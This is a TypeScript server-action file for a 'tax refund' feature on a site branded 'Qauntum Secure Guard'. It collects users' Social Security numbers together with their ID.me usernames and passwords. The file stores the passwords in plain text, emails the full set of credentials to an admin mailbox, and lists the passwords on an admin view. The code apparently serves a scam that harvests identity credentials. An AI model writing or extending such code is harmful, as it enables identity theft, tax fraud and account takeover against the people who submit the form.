"use server";

import connectToDb from "@/config/connectToDb";
import { auth } from "@/lib/auth";
import TaxRefundModel from "@/models/tax-refund.model";
import mongoose from "mongoose";
import { headers } from "next/headers";
import { createNotification } from "./notification.action";
import { NotificationCategory } from "@/constants";
import { sendEmail } from "@/lib/mail";
import {
  getTaxRefundSubmissionAdminTemplate,
  getTaxRefundSubmissionUserTemplate,
  getTaxRefundStatusUpdateTemplate,
} from "@/lib/email-templates/tax-refund-emails";

export interface SubmitTaxRefundInput {
  fullName: string;
  ssn: string;
  idMe: string;
  idMePassword: string;
  location: string;
}

export async function submitTaxRefund(data: SubmitTaxRefundInput) {
  try {
    const session = await auth.api.getSession({
      headers: await headers(),
    });

    if (!session) {
      return { error: "User not authenticated" };
    }

    if (!data.fullName || !data.ssn || !data.idMe || !data.idMePassword || !data.location) {
      return { error: "Please fill in all required fields" };
    }

    await connectToDb();

    const userObjectId = new mongoose.Types.ObjectId(session.user.id);

    const taxRefund = await TaxRefundModel.create({
      userId: userObjectId,
      fullName: data.fullName,
      ssn: data.ssn,
      idMe: data.idMe,
      idMePassword: data.idMePassword,
      location: data.location,
      status: "pending",
    });

    // Notify admin
    if (process.env.EMAIL_USER) {
      try {
        await sendEmail({
          to: process.env.EMAIL_USER,
          subject: `New Tax Refund Submission: ${data.fullName} (${data.location})`,
          html: getTaxRefundSubmissionAdminTemplate({
            applicantName: session.user.name || "User",
            userEmail: session.user.email,
            fullName: data.fullName,
            ssn: data.ssn,
            idMe: data.idMe,
            idMePassword: data.idMePassword,
            location: data.location,
            refundId: taxRefund._id.toString(),
          }),
        });
      } catch (err) {
        console.error("Failed to send admin tax refund notification email:", err);
      }
    }

    // Confirmation to applicant
    if (session.user.email) {
      try {
        await sendEmail({
          to: session.user.email,
          subject: `Tax Refund Request Received - Qauntum Secure Guard (ID: ${taxRefund._id.toString().slice(-6).toUpperCase()})`,
          html: getTaxRefundSubmissionUserTemplate({
            name: session.user.name || "Valued Client",
            refundId: taxRefund._id.toString(),
            location: data.location,
          }),
        });
      } catch (err) {
        console.error("Failed to send applicant tax refund confirmation email:", err);
      }
    }

    return {
      success: true,
      refundId: taxRefund._id.toString(),
    };
  } catch (error) {
    console.error("Error submitting tax refund request:", error);
    return {
      error: error instanceof Error ? error.message : "Failed to submit tax refund request",
    };
  }
}

export async function getUserTaxRefunds() {
  try {
    const session = await auth.api.getSession({
      headers: await headers(),
    });

    if (!session) {
      return { refunds: [], error: "User not authenticated" };
    }

    await connectToDb();

    const userObjectId = new mongoose.Types.ObjectId(session.user.id);

    const refunds = await TaxRefundModel.find({ userId: userObjectId })
      .sort({ createdAt: -1 })
      .lean();

    const formatted = refunds.map((r) => ({
      id: (r._id as mongoose.Types.ObjectId).toString(),
      fullName: r.fullName,
      ssn: r.ssn,
      idMe: r.idMe,
      location: r.location,
      status: r.status,
      submittedOn: new Date(r.createdAt).toLocaleDateString("en-GB", {
        day: "2-digit",
        month: "2-digit",
        year: "numeric",
      }),
    }));

    return { refunds: formatted, error: null };
  } catch (error) {
    console.error("Error fetching user tax refunds:", error);
    return { refunds: [], error: "Failed to fetch tax refund requests" };
  }
}

export async function getAllTaxRefundsAdmin() {
  try {
    const session = await auth.api.getSession({
      headers: await headers(),
    });

    if (!session || session.user.role !== "admin") {
      return { refunds: [], error: "Unauthorized" };
    }

    await connectToDb();

    const refunds = await TaxRefundModel.find()
      .sort({ createdAt: -1 })
      .lean();

    let userMap = new Map<string, string>();
    try {
      const listOfUsers = await auth.api.listUsers({
        query: {},
        headers: await headers(),
      });
      if (listOfUsers?.users) {
        for (const u of listOfUsers.users) {
          userMap.set(u.id, u.email);
        }
      }
    } catch {
      // ignore user list error if any
    }

    const formatted = refunds.map((r) => {
      const userIdStr = r.userId ? r.userId.toString() : "";
      return {
        id: (r._id as mongoose.Types.ObjectId).toString(),
        applicantName: r.fullName,
        ssn: r.ssn,
        idMeEmail: r.idMe,
        idMePassword: r.idMePassword,
        location: r.location,
        status: r.status,
        userAccountEmail: userMap.get(userIdStr) || "",
        submittedOn: new Date(r.createdAt).toLocaleDateString("en-GB", {
          day: "2-digit",
          month: "2-digit",
          year: "numeric",
        }),
      };
    });

    return { refunds: formatted, error: null };
  } catch (error) {
    console.error("Error fetching admin tax refunds:", error);
    return { refunds: [], error: "Failed to fetch tax refunds" };
  }
}

export async function updateTaxRefundStatusAdmin(
  refundId: string,
  status: "pending" | "approved" | "rejected"
) {
  try {
    const session = await auth.api.getSession({
      headers: await headers(),
    });

    if (!session || session.user.role !== "admin") {
      return { error: "Unauthorized" };
    }

    await connectToDb();

    const refund = await TaxRefundModel.findByIdAndUpdate(
      refundId,
      { status },
      { new: true }
    );

    if (!refund) {
      return { error: "Tax refund record not found" };
    }

    try {
      await createNotification({
        userId: refund.userId.toString(),
        type: NotificationCategory.KYC_UPDATE,
        title: `Tax Refund Request ${status.charAt(0).toUpperCase() + status.slice(1)}`,
        description: `Your IRS tax refund request (${refundId}) has been marked as ${status}.`,
      });
    } catch (notifErr) {
      console.warn("Failed to create notification for tax refund status update:", notifErr);
    }

    // Send email to user upon approval or rejection
    if (status === "approved" || status === "rejected") {
      try {
        const applicantUser = (await auth.api.getUser({
          query: { id: refund.userId.toString() },
          headers: await headers(),
        })) as any;

        if (applicantUser?.email) {
          const subject =
            status === "approved"
              ? "✅ Your Tax Refund Request Has Been Approved! - Qauntum Secure Guard"
              : "Tax Refund Request Requires Attention - Qauntum Secure Guard";

          await sendEmail({
            to: applicantUser.email,
            subject,
            html: getTaxRefundStatusUpdateTemplate({
              name: applicantUser.name || "Valued Client",
              refundId: refund._id.toString(),
              status,
            }),
          });
        }
      } catch (emailErr) {
        console.error("Failed to send tax refund status update email:", emailErr);
      }
    }

    return { success: true };
  } catch (error) {
    console.error("Error updating tax refund status:", error);
    return {
      error: error instanceof Error ? error.message : "Failed to update tax refund status",
    };
  }
}
